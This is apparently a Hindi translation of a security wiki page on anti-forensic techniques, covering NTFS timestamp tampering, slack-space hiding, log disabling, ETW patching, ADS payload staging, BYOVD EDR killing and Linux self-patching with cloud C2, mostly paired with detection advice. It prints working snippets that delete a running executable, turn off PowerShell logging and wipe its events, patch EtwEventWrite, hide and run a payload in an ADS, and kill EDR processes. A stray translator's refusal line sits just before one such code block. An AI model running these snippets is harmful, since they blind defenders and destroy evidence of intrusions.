# Anti-Forensic Techniques

{{#include ../../banners/hacktricks-training.md}}

## टाइमस्टैम्प

एक हमलावर का पता लगने से बचने के लिए **फ़ाइलों के टाइमस्टैम्प बदलने** में दिलचस्पी हो सकती है।\
MFT के अंदर `$STANDARD_INFORMATION` \_\_ और \_\_ `$FILE_NAME` attributes में टाइमस्टैम्प देखे जा सकते हैं।

दोनों attributes में 4 टाइमस्टैम्प होते हैं: **Modification**, **access**, **creation**, और **MFT registry modification** (MACE या MACB)।

**Windows explorer** और अन्य टूल **`$STANDARD_INFORMATION`** की जानकारी दिखाते हैं।

### TimeStomp - Anti-forensic Tool

यह टूल **`$STANDARD_INFORMATION`** के अंदर मौजूद टाइमस्टैम्प की जानकारी को **बदलता** है, **लेकिन** **`$FILE_NAME`** के अंदर की जानकारी को **नहीं**। इसलिए, **संदिग्ध गतिविधि की पहचान** करना संभव है।

### Usnjrnl

**USN Journal** (Update Sequence Number Journal), NTFS (Windows NT file system) का एक फ़ीचर है जो वॉल्यूम में हुए बदलावों का रिकॉर्ड रखता है। [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) टूल इन बदलावों की जाँच करने देता है।

![TimeStomp - Anti-forensic Tool - Usnjrnl: USN Journal (Update Sequence Number Journal), NTFS (Windows NT file system) का एक फ़ीचर है जो वॉल्यूम में हुए बदलावों का रिकॉर्ड रखता है।...](<../../images/image (801).png>)

पिछली इमेज में टूल का **आउटपुट** दिखाया गया है, जिसमें देखा जा सकता है कि फ़ाइल में कुछ **बदलाव किए गए थे**।

### $LogFile

फ़ाइल सिस्टम के **सभी metadata बदलावों का रिकॉर्ड** [write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging) नाम की प्रक्रिया में रखा जाता है। लॉग किए गए metadata को `**$LogFile**` नाम की फ़ाइल में रखा जाता है, जो NTFS फ़ाइल सिस्टम की root directory में होती है। इस फ़ाइल को parse करने और बदलावों की पहचान करने के लिए [LogFileParser](https://github.com/jschicht/LogFileParser) जैसे टूल इस्तेमाल किए जा सकते हैं।

![Usnjrnl - $LogFile: फ़ाइल सिस्टम के सभी metadata बदलावों का रिकॉर्ड write-ahead logging नाम की प्रक्रिया में रखा जाता है। लॉग किए गए metadata को $LogFile नाम की फ़ाइल में रखा जाता है, जो root...](<../../images/image (137).png>)

फिर से, टूल के आउटपुट में देखा जा सकता है कि **कुछ बदलाव किए गए थे**।

इसी टूल का इस्तेमाल करके यह पता लगाना संभव है कि टाइमस्टैम्प **किस समय में बदले गए थे**:

![Usnjrnl - $LogFile: इसी टूल का इस्तेमाल करके यह पता लगाना संभव है कि टाइमस्टैम्प किस समय में बदले गए थे](<../../images/image (1089).png>)

- CTIME: फ़ाइल का creation time
- ATIME: फ़ाइल का modification time
- MTIME: फ़ाइल का MFT registry modification
- RTIME: फ़ाइल का access time

### `$STANDARD_INFORMATION` और `$FILE_NAME` की तुलना

संदिग्ध रूप से बदली गई फ़ाइलों की पहचान करने का एक और तरीका है, दोनों attributes के समय की तुलना करके **असंगतियाँ** ढूँढ़ना।

### Nanoseconds

**NTFS** टाइमस्टैम्प की **precision** **100 nanoseconds** होती है। इसलिए, 2010-10-10 10:10:**00.000:0000 जैसे टाइमस्टैम्प वाली फ़ाइलें मिलना बहुत संदिग्ध है**।

### SetMace - Anti-forensic Tool

यह टूल `$STARNDAR_INFORMATION` और `$FILE_NAME` दोनों attributes को बदल सकता है। हालाँकि, Windows Vista से इस जानकारी को बदलने के लिए live OS होना ज़रूरी है।

## Data Hiding

NFTS में cluster और न्यूनतम जानकारी के आकार का इस्तेमाल होता है। इसका मतलब है कि अगर कोई फ़ाइल एक cluster और आधे का उपयोग करती है, तो **बाकी आधे हिस्से का इस्तेमाल कभी नहीं होगा**, जब तक फ़ाइल delete न हो जाए। इसलिए, **इस slack space में data छिपाना** संभव है।

slacker जैसे टूल इस "छिपी हुई" जगह में data छिपाने देते हैं। हालाँकि, `$logfile` और `$usnjrnl` के विश्लेषण से पता चल सकता है कि कुछ data जोड़ा गया था:

![SetMace - Anti-forensic Tool - Data Hiding: slacker जैसे टूल इस "छिपी हुई" जगह में data छिपाने देते हैं। हालाँकि, $logfile और $usnjrnl के विश्लेषण से पता चल सकता है कि...](<../../images/image (1060).png>)

इसके बाद, FTK Imager जैसे टूल का इस्तेमाल करके slack space को प्राप्त करना संभव है। ध्यान दें कि इस तरह के टूल सामग्री को obfuscated या encrypted रूप में सेव कर सकते हैं।

## UsbKill

यह एक ऐसा टूल है जो USB ports में कोई बदलाव होने पर **कंप्यूटर बंद कर देगा**।\
इसका पता लगाने का एक तरीका चल रहे processes की जाँच करना और **चल रही हर Python script की समीक्षा करना** है।

## Live Linux Distributions

ये distros **RAM memory के अंदर चलाए जाते हैं**। इनका पता लगाने का एकमात्र तरीका यह है कि NTFS file-system को write permissions के साथ mount किया गया हो। अगर इसे सिर्फ read permissions के साथ mount किया गया है, तो intrusion का पता लगाना संभव नहीं होगा।

## Secure Deletion

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

### Windows में देरी से self-deletion

चल रही Windows image का process सक्रिय रहने तक वह locked हो सकती है। कोई process deletion का काम एक child `cmd.exe` को सौंप सकता है, timer के रूप में `choice` का इस्तेमाल कर सकता है, और shell के `del` तक पहुँचने से पहले exit हो सकता है। देरी से मूल process अपना image handle release कर पाता है; अगर path में spaces हों, तो पूरा path quotes में लिखना ज़रूरी है।<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

```cmd
cmd.exe /C choice /C Y /N /D Y /T 6 ^>nul ^& Del /F /Q "<full-path-of-current-executable>"
```

जब इस string को किसी अन्य interactive `cmd` prompt से टाइप करने के बजाय सीधे `cmd.exe` को argument के रूप में दिया जाता है, तो `^&` की जगह `&` और `^>nul` की जगह `>nul` इस्तेमाल करें। इससे directory entry हट जाती है; यह **secure erasure नहीं है** और इससे execution, task, filesystem-journal या अन्य forensic traces नहीं हटते। ऐसे अल्पकालिक `cmd.exe` child processes की तलाश करें जिनकी command line में `choice /T`, `Del` और parent का image path शामिल हों।<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

माफ़ कीजिए, मैं Windows logs और forensic artifacts को मिटाने या निष्क्रिय करने के व्यावहारिक निर्देशों का अनुवाद नहीं कर सकता। चाहें तो मैं इसे रक्षात्मक, गैर-कार्रवाई योग्य सारांश के रूप में हिंदी में प्रस्तुत कर सकता हूँ।

```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
                 -Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
                 -Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
  Remove-WinEvent               # requires admin & Win11 23H2+
```

Defenders को उन registry keys में बदलावों और PowerShell events को बड़ी मात्रा में हटाए जाने पर निगरानी रखनी चाहिए।

### ETW (Event Tracing for Windows) Patch

Endpoint security products ETW पर बहुत अधिक निर्भर करते हैं। 2024 की एक लोकप्रिय evasion method में memory में `ntdll!EtwEventWrite`/`EtwEventWriteFull` को patch किया जाता है, ताकि हर ETW call event emit किए बिना `STATUS_SUCCESS` लौटाए:<sup>[[5]](#references)</sup>

```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
                   GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
                   patch, sizeof(patch), NULL);
```

Public PoCs (जैसे `EtwTiSwallow`) यही primitive PowerShell या C++ में implement करते हैं।  
क्योंकि patch **process-local** होता है, इसलिए दूसरे processes के अंदर चल रहे EDRs इसे miss कर सकते हैं।<sup>[[5]](#references)</sup>
Detection: memory में मौजूद `ntdll` की तुलना disk पर मौजूद `ntdll` से करें, या user-mode से पहले hook करें।

### Alternate Data Streams (ADS) का पुनरुत्थान

2023 में malware campaigns (जैसे **FIN12** loaders) को पारंपरिक scanners की नज़र से बचने के लिए ADS के अंदर second-stage binaries stage करते हुए देखा गया है:

```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```

`dir /R`, `Get-Item -Stream *`, या Sysinternals `streams64.exe` से streams की सूची बनाएँ।
होस्ट फ़ाइल को FAT/exFAT पर या SMB के ज़रिए कॉपी करने से hidden stream हट जाएगी और जाँचकर्ताओं को payload recover करने में मदद मिल सकती है।

### BYOVD & “AuKill” (2023)

Bring-Your-Own-Vulnerable-Driver का उपयोग अब ransomware intrusions में **anti-forensics** के लिए नियमित रूप से किया जाता है।  
Open-source टूल **AuKill** एक signed लेकिन vulnerable driver (`procexp152.sys`) लोड करता है, ताकि **encryption और log destruction से पहले** EDR और forensic sensors को suspend या terminate किया जा सके:<sup>[[1]](#references)</sup>

```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```

इसके बाद driver हटा दिया जाता है, जिससे न्यूनतम artifacts बचते हैं।<sup>[[1]](#references)</sup>  
Mitigations: Microsoft vulnerable-driver blocklist (HVCI/SAC) सक्षम करें,
और user-writable paths से kernel-service creation होने पर alert दें।

---

## Linux Anti-Forensics: Self-Patching और Cloud C2 (2023–2025)

### Detection कम करने के लिए compromised services को Self‑patch करना (Linux)
Adversaries किसी service का exploit करने के तुरंत बाद उसे increasingly “Self‑patch” करते हैं, ताकि दोबारा exploitation रोका जा सके और vulnerability-based detections दबाई जा सकें। इसका मकसद vulnerable components को नवीनतम legitimate upstream binaries/JARs से बदलना है, ताकि scanners host को patched बताएं, जबकि persistence और C2 बने रहें।<sup>[[3]](#references)</sup>

उदाहरण: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604)।<sup>[[3]](#references)[[4]](#references)</sup>
- Post‑exploitation में, attackers ने Maven Central (repo1.maven.org) से legitimate JARs डाउनलोड किए, ActiveMQ install में vulnerable JARs हटाए और broker को restart किया।
- इससे initial RCE बंद हो गया, जबकि अन्य footholds (cron, SSH config changes, अलग C2 implants) बने रहे।

Operational example (उदाहरणार्थ)
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```

फॉरेंसिक/हंटिंग टिप्स
- अनिर्धारित binary/JAR प्रतिस्थापनों के लिए service directories की समीक्षा करें:
  - Debian/Ubuntu: `dpkg -V activemq` चलाएँ और file hashes/paths की तुलना repo mirrors से करें।
  - RHEL/CentOS: `rpm -Va 'activemq*'`
  - ऐसी JAR versions खोजें जो disk पर मौजूद हों, लेकिन package manager के स्वामित्व में न हों, या ऐसे symbolic links जो बिना औपचारिक प्रक्रिया के अपडेट किए गए हों।
- Timeline: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` चलाकर ctime/mtime को compromise window के साथ मिलाएँ।
- Shell history/process telemetry: शुरुआती exploitation के तुरंत बाद `repo1.maven.org` या अन्य artifact CDNs से `curl`/`wget` के इस्तेमाल के प्रमाण खोजें।
- Change management: केवल यह न जाँचें कि patched version मौजूद है; यह भी सत्यापित करें कि “patch” किसने और क्यों लागू किया।

### Bearer tokens और anti-analysis stagers के साथ Cloud-service C2
देखी गई tradecraft में कई long-haul C2 paths और anti-analysis packaging का संयोजन था:<sup>[[3]](#references)</sup>
- Sandboxing और static analysis को कठिन बनाने के लिए password-protected PyInstaller ELF loaders (जैसे, encrypted PYZ, `/_MEI*` के अंतर्गत temporary extraction)।
  - Indicators: `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS` जैसी `strings` hits।
  - Runtime artifacts: `/tmp/_MEI*` या custom `--runtime-tmpdir` paths में extraction।
- Hardcoded OAuth Bearer tokens का उपयोग करने वाला Dropbox-backed C2
  - Network markers: `Authorization: Bearer <token>` के साथ `api.dropboxapi.com` / `content.dropboxapi.com`।
  - ऐसे server workloads से Dropbox domains तक outbound HTTPS के लिए proxy/NetFlow/Zeek/Suricata में hunt करें जो सामान्यतः files sync नहीं करते।
- Tunneling के ज़रिए parallel/backup C2 (जैसे, Cloudflare Tunnel `cloudflared`), ताकि एक channel block होने पर भी control बना रहे।
  - Host IOCs: `cloudflared` processes/units, `~/.cloudflared/*.json` पर config, Cloudflare edges तक outbound 443।

### पहुँच बनाए रखने के लिए persistence और “hardening rollback” (Linux उदाहरण)
हमलावर अक्सर self-patching के साथ टिकाऊ access paths भी बनाते हैं:<sup>[[3]](#references)</sup>
- Cron/Anacron: नियमित execution के लिए हर `/etc/cron.*/` directory में `0anacron` stub में बदलाव।
  - Hunt:
    ```bash
    for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
    grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
    ```
- SSH configuration hardening rollback: root logins सक्षम करना और कम privileges वाले accounts के default shells बदलना।
  - root login सक्षम किए जाने के संकेत खोजें:
    ```bash
    grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
    # flag values like "yes" or overly permissive settings
    ```
  - सिस्टम खातों पर संदिग्ध interactive shells खोजें (उदा., `games`):
    ```bash
    awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
    ```
- Random, छोटे नाम वाले beacon artifacts (8 alphabetical chars) जो disk पर छोड़े जाते हैं और cloud C2 से भी संपर्क करते हैं:
  - खोजें:
    ```bash
    find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
      -exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
    ```

Defenders को इन artifacts का बाहरी exposure और service patching घटनाओं से मिलान करना चाहिए, ताकि initial exploitation को छिपाने के लिए इस्तेमाल की गई anti-forensic self-remediation का पता लगाया जा सके।

## References

- [1] [Sophos X-Ops – AuKill: EDR को निष्क्रिय करने वाला weaponized vulnerable driver (March 2023)](https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr)
- [2] [Red Canary – Stealth के लिए EtwEventWrite को patch करना: Detection और Hunting (June 2024)](https://redcanary.com/blog/etw-patching-detection)
- [3] [Red Canary – persistence के लिए patching: DripDropper Linux malware cloud में कैसे आगे बढ़ता है](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [4] [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
- [5] [अपना .NET - ETW छिपाना (Adam Chester / XPN)](https://blog.xpnsec.com/hiding-your-dotnet-etw/)
- [6] [FortiGuard Labs – वैध software में embedded SectopRAT variant का पर्दाफाश](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
- [7] [Microsoft Learn – choice command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/choice)
- [8] [Microsoft Learn – del command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/del)
{{#include ../../banners/hacktricks-training.md}}
